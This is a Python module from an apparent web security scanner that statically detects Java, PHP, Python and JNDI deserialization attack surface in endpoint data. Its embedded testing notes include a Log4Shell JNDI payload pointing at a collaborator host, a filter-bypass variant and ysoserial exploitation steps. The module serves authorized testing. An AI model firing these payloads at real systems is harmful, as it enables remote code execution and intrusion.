"""
DeserializationMapper - Java/PHP/Python/Node deserialization attack surface detection.
Pure static analysis of collected endpoint and JS data. Zero HTTP requests.

Detection cases:
  1. Parameter names matching known deserialization sinks (viewstate, serialized, jndi, etc.)
  2. Base64-encoded blob values with Java serialization magic bytes (rO0AB) in params
  3. JNDI injection surface: Log4Shell-style parameters (any user-input that hits logging)
  4. Content-Type: application/x-java-serialized-object endpoints
  5. PHP serialization markers in param values (O: or a: prefix patterns)
  6. Python pickle/marshal patterns in API endpoints (/pickle, /marshal in path)
"""
import re
from typing import List, Set

from .base import BaseSurfaceMapper
from ..models import SurfaceResult, AttackCategory, ConfidenceLevel
from ..evidence import Evidence, EvidenceType
from ..param_semantics import (
    ALL_DESERIALIZE_PARAMS, classify_param, ParamType,
    _DESERIALIZE_HIGH, _DESERIALIZE_MEDIUM,
)
from ...storage.models import ScanResult, Endpoint

# Java serialized object magic bytes - base64 encoded "rO0A" prefix
_JAVA_MAGIC_RE = re.compile(r'\brO0AB[A-Za-z0-9+/]{4,}')

# PHP serialize format: O:digits or a:digits
_PHP_SERIALIZE_RE = re.compile(r'\b[OaCbds]:\d+:', re.A)

# JNDI lookup patterns - Log4Shell-style
_JNDI_RE = re.compile(r'\$\{jndi:', re.I)

# Paths that indicate native serialization endpoints
_SERIALIZE_PATH_SIGNALS = (
    "/pickle", "/marshal", "/serialized", "/deserialize",
    "/rmi", "/jmx", "/iiop",
)

# Content-Type values that mean the body is a serialized object
_SERIALIZE_CONTENT_TYPES = {
    "application/x-java-serialized-object",
    "application/x-www-form-urlencoded+java",
    "application/octet-stream",  # common for binary serialized payloads
}

_BURP_NOTES_PARAM = (
    "Deserialization sink parameter detected. Steps: "
    "1) Send a Java ysoserial payload (base64-encoded) and look for DNS/OOB interaction via Burp Collaborator. "
    "2) Try viewstate exploit chains with ViewStateUserKey missing. "
    "3) For PHP: craft O:8:\"stdClass\":0:{} test payload. "
    "4) Check for class allow-list filtering in error responses."
)

_BURP_NOTES_JAVA_MAGIC = (
    "Java serialized object magic bytes (rO0AB) detected in parameter value. "
    "Server is accepting serialized Java objects from the client. "
    "1) Use ysoserial to generate gadget chain payloads (Commons Collections, Spring, etc.). "
    "2) Send payload via Burp Intruder with Burp Collaborator for OOB detection. "
    "3) If the server throws a Java exception, the deserializer IS processing the input."
)

_BURP_NOTES_JNDI = (
    "JNDI injection surface (Log4Shell pattern) - parameter value contains ${jndi: prefix. "
    "1) Replace value with ${jndi:ldap://your-collaborator.oastify.com/a}. "
    "2) Watch Burp Collaborator for DNS/TCP callbacks. "
    "3) Try variants: ${${lower:j}ndi:ldap://...} to bypass filters."
)

_BURP_NOTES_CONTENT_TYPE = (
    "Endpoint accepts Java serialized object Content-Type. "
    "This endpoint explicitly processes binary serialized Java objects. "
    "1) Capture a request body and decode from base64. "
    "2) Replace with ysoserial payload for relevant Java libraries. "
    "3) Send and look for OOB callbacks or delayed responses (sleep gadgets)."
)

_BURP_NOTES_PATH = (
    "Endpoint path suggests native serialization processing. "
    "1) Send raw POST with a serialized payload and observe error messages. "
    "2) Try ysoserial (Java), pickle exploit (Python), or native PHP serialize for the stack. "
    "3) OOB interaction via Burp Collaborator is the most reliable detection method."
)


def _has_java_magic(value: str) -> bool:
    return bool(_JAVA_MAGIC_RE.search(value))


def _has_php_serialize(value: str) -> bool:
    return bool(_PHP_SERIALIZE_RE.match(value.strip()))


def _has_jndi(value: str) -> bool:
    return bool(_JNDI_RE.search(value))


def _path_is_serialization(path: str) -> bool:
    p = path.lower()
    return any(sig in p for sig in _SERIALIZE_PATH_SIGNALS)


def _content_type_is_serialized(headers: dict) -> bool:
    for k, v in headers.items():
        if k.lower() == "content-type":
            ct = (v or "").lower().split(";")[0].strip()
            return ct in _SERIALIZE_CONTENT_TYPES
    return False


class DeserializationMapper(BaseSurfaceMapper):
    category = AttackCategory.DESERIALIZATION

    def map(self, result: ScanResult) -> List[SurfaceResult]:
        seen: Set[str] = set()

        for ep in result.endpoints:
            url      = ep.url or ""
            method   = (ep.method or "GET").upper()
            path     = ep.path or ""
            auth_ctx = ep.auth_context or ""
            req_hdrs = ep.request_headers or {}

            all_params = (
                list(ep.query_params or []) +
                list(ep.path_params or []) +
                list(ep.body_fields or [])
            )

            # Check 1: deserialization sink param names
            for param in all_params:
                pname = (param.get("name") or "") if isinstance(param, dict) else str(param)
                pval  = (param.get("value") or "") if isinstance(param, dict) else ""
                norm  = pname.lower().strip()
                if not norm:
                    continue

                cls = classify_param(pname, pval)
                if cls.param_type != ParamType.DESERIALIZE:
                    continue

                key = f"deser_param:{method}:{url}:{norm}"
                if key in seen:
                    continue
                seen.add(key)

                # Boost if value looks like Java magic bytes or PHP serialize
                java_magic = _has_java_magic(pval)
                php_serial = _has_php_serialize(pval)
                jndi_hit   = _has_jndi(pval)

                if jndi_hit:
                    surface_type = "Deserialization: JNDI Injection"
                    conf         = ConfidenceLevel.HIGH
                    notes        = _BURP_NOTES_JNDI
                    ev_detail    = f"JNDI pattern in parameter '{pname}' value"
                    raw_conf     = 85
                elif java_magic:
                    surface_type = "Deserialization: Java Object"
                    conf         = ConfidenceLevel.HIGH
                    notes        = _BURP_NOTES_JAVA_MAGIC
                    ev_detail    = f"Java serialization magic bytes (rO0AB) in '{pname}'"
                    raw_conf     = 80
                elif php_serial:
                    surface_type = "Deserialization: PHP Object"
                    conf         = ConfidenceLevel.HIGH
                    notes        = _BURP_NOTES_PARAM
                    ev_detail    = f"PHP serialization format in parameter '{pname}'"
                    raw_conf     = 75
                else:
                    surface_type = "Deserialization: Sink Parameter"
                    conf         = ConfidenceLevel.MEDIUM
                    notes        = _BURP_NOTES_PARAM
                    ev_detail    = f"Deserialization sink parameter name: '{pname}'"
                    raw_conf     = int(cls.raw_confidence * 100)

                evidence = [f"{method} {url} - parameter '{pname}' is a deserialization sink"]
                if java_magic:
                    evidence.append("Java serialized object magic bytes in parameter value")
                if php_serial:
                    evidence.append("PHP serialization format detected in parameter value")
                if jndi_hit:
                    evidence.append("JNDI expression in parameter value - Log4Shell-style injection")
                if auth_ctx:
                    evidence.append(f"Auth context: {auth_ctx}")

                self._candidate(
                    endpoint     = ep,
                    surface_type = surface_type,
                    parameters   = [pname],
                    confidence   = conf,
                    evidence     = evidence,
                    burp_notes   = notes,
                    auth_context = auth_ctx,
                )

                ev_list = [
                    Evidence(
                        evidence_type  = EvidenceType.PARAMETER_SEMANTIC,
                        source         = "static",
                        asset          = url,
                        endpoint       = url,
                        parameter      = pname,
                        context        = surface_type,
                        details        = ev_detail,
                        raw_confidence = raw_conf,
                    ),
                ]
                if auth_ctx:
                    ev_list.append(Evidence(
                        evidence_type = EvidenceType.AUTHENTICATION_CONTEXT,
                        source        = "static",
                        asset         = url,
                        context       = f"Auth context: {auth_ctx}",
                        details       = auth_ctx,
                    ))
                self._emit_evidence(
                    evidence     = ev_list,
                    surface_type = surface_type,
                    endpoint     = url,
                    method       = method,
                    parameter    = pname,
                    notes        = notes,
                )

            # Check 2: Java serialized Content-Type in request headers
            if _content_type_is_serialized(req_hdrs):
                key = f"deser_ct:{method}:{url}"
                if key not in seen:
                    seen.add(key)
                    ct_val = req_hdrs.get("content-type") or req_hdrs.get("Content-Type", "")
                    evidence = [
                        f"{method} {url} - Content-Type indicates serialized object body: {ct_val}",
                        "Endpoint explicitly processes binary serialized data - primary deserialization attack surface",
                    ]
                    if auth_ctx:
                        evidence.append(f"Auth context: {auth_ctx}")
                    self._candidate(
                        endpoint     = ep,
                        surface_type = "Deserialization: Serialized Content-Type",
                        parameters   = ["Content-Type"],
                        confidence   = ConfidenceLevel.HIGH,
                        evidence     = evidence,
                        burp_notes   = _BURP_NOTES_CONTENT_TYPE,
                        auth_context = auth_ctx,
                    )
                    self._emit_evidence(
                        evidence     = [
                            Evidence(
                                evidence_type  = EvidenceType.RESPONSE_HEADER,
                                source         = "static",
                                asset          = url,
                                endpoint       = url,
                                context        = f"Serialized object Content-Type: {ct_val}",
                                details        = "Endpoint accepts binary serialized objects via Content-Type header",
                                raw_confidence = 75,
                            ),
                        ],
                        surface_type = "Deserialization: Serialized Content-Type",
                        endpoint     = url,
                        method       = method,
                        parameter    = "Content-Type",
                        notes        = _BURP_NOTES_CONTENT_TYPE,
                    )

            # Check 3: serialization path signals in the URL
            if _path_is_serialization(path):
                key = f"deser_path:{method}:{url}"
                if key not in seen:
                    seen.add(key)
                    evidence = [
                        f"{method} {url} - path suggests native serialization processing",
                        f"Path segment matches deserialization endpoint pattern",
                    ]
                    if auth_ctx:
                        evidence.append(f"Auth context: {auth_ctx}")
                    self._candidate(
                        endpoint     = ep,
                        surface_type = "Deserialization: Serialization Endpoint",
                        parameters   = [],
                        confidence   = ConfidenceLevel.MEDIUM,
                        evidence     = evidence,
                        burp_notes   = _BURP_NOTES_PATH,
                        auth_context = auth_ctx,
                    )
                    self._emit_evidence(
                        evidence     = [
                            Evidence(
                                evidence_type  = EvidenceType.ROUTE_DECLARATION,
                                source         = "static",
                                asset          = url,
                                endpoint       = url,
                                context        = "Serialization endpoint path pattern",
                                details        = f"Path '{path}' matches known deserialization endpoint naming",
                                raw_confidence = 50,
                            ),
                        ],
                        surface_type = "Deserialization: Serialization Endpoint",
                        endpoint     = url,
                        method       = method,
                        parameter    = "",
                        notes        = _BURP_NOTES_PATH,
                    )

        return self._results
